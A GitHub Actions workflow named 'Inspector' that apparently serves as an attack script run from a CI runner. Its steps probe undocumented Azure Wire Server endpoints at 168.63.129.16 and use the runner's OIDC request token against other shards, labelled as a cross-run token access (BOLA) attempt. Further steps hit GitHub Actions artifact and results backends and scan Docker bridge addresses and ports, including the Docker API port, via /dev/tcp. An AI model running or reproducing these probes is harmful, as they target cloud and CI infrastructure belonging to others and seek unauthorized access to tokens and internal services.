name: Inspector
on:
  workflow_dispatch:
permissions:
  contents: read
  id-token: write
jobs:
  inspect:
    runs-on: ubuntu-latest
    steps:
      - name: Azure Wire Server (168.63.129.16) - undocumented endpoints
        run: |
          WIRE=168.63.129.16
          echo "=== WIRE SERVER PROBING ==="
          # Known Azure Wire Server endpoints
          for path in "/" "/machine?comp=goalstate" "/machine?comp=health" \
              "/machine?comp=roleEnvironment" "/machine?comp=extensions" \
              "/?comp=acls" "/?comp=acls&type=tunneledpacket" \
              "/metadata/instance" "/metadata/identity" \
              "/hostgaservice" "/hostgaservice/health" \
              "/$system/thread" "/WireServer" "/health" \
              "/machine" "/acls" "/packages" "/versions"; do
            HTTP=$(curl -s --max-time 4 -o /tmp/wire_resp.txt -w "%{http_code}" \
              "http://$WIRE$path" 2>/dev/null)
            SIZE=$(wc -c < /tmp/wire_resp.txt 2>/dev/null || echo 0)
            if [ "$HTTP" != "000" ] && [ "$HTTP" != "404" ]; then
              echo "  [$HTTP] $SIZE bytes -> http://$WIRE$path"
              if [ "$HTTP" = "200" ] && [ "$SIZE" -lt 500 ]; then
                cat /tmp/wire_resp.txt
                echo ""
              fi
            fi
          done

      - name: OIDC shard BOLA - cross-run token access
        run: |
          echo "=== OWN OIDC URL SHARD ==="
          echo "$ACTIONS_ID_TOKEN_REQUEST_URL"
          BASE=$(echo "$ACTIONS_ID_TOKEN_REQUEST_URL" | grep -oP 'https://[^/]+')
          SHARD=$(echo "$ACTIONS_ID_TOKEN_REQUEST_URL" | grep -oP '(?<=\.com/)\d+')
          echo "Shard: $SHARD"
          echo ""
          echo "=== TRY OTHER SHARDS (BOLA) ==="
          for s in 0 1 2 3 4 5 10 22 50 77 100; do
            URL="${BASE}/${s}//idtoken/00000000-0000-0000-0000-000000000000/00000000-0000-0000-0000-000000000000?api-version=2.0"
            HTTP=$(curl -sf --max-time 4 \
              -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
              "$URL&audience=sigstore" -o /dev/null -w "%{http_code}" 2>/dev/null)
            echo "  shard $s -> HTTP $HTTP"
          done

      - name: Results API - artifact backend probe
        run: |
          echo "=== RESULTS API ENDPOINTS ==="
          for host in "results.actions.githubusercontent.com" \
              "artifactcache.actions.githubusercontent.com" \
              "pipelines.actions.githubusercontent.com"; do
            for path in "/" "/health" "/_ping" "/twirp/" \
                "/twirp/github.actions.results.api.v1.ArtifactService/"; do
              HTTP=$(curl -sf --max-time 5 "https://$host$path" -o /dev/null -w "%{http_code}" 2>/dev/null || echo "ERR")
              [ "$HTTP" != "000" ] && echo "  $host$path -> $HTTP"
            done
          done

      - name: Docker network SSRF
        run: |
          echo "=== DOCKER NETWORK SCAN ==="
          for ip in 172.17.0.1 172.17.0.2 172.17.0.3 172.18.0.1; do
            for port in 80 443 2375 2376 8080 5000; do
              OK=$(timeout 1 bash -c "echo >/dev/tcp/$ip/$port" 2>/dev/null && echo "OPEN")
              [ -n "$OK" ] && echo "  $ip:$port OPEN"
            done
          done
          echo "(done)"
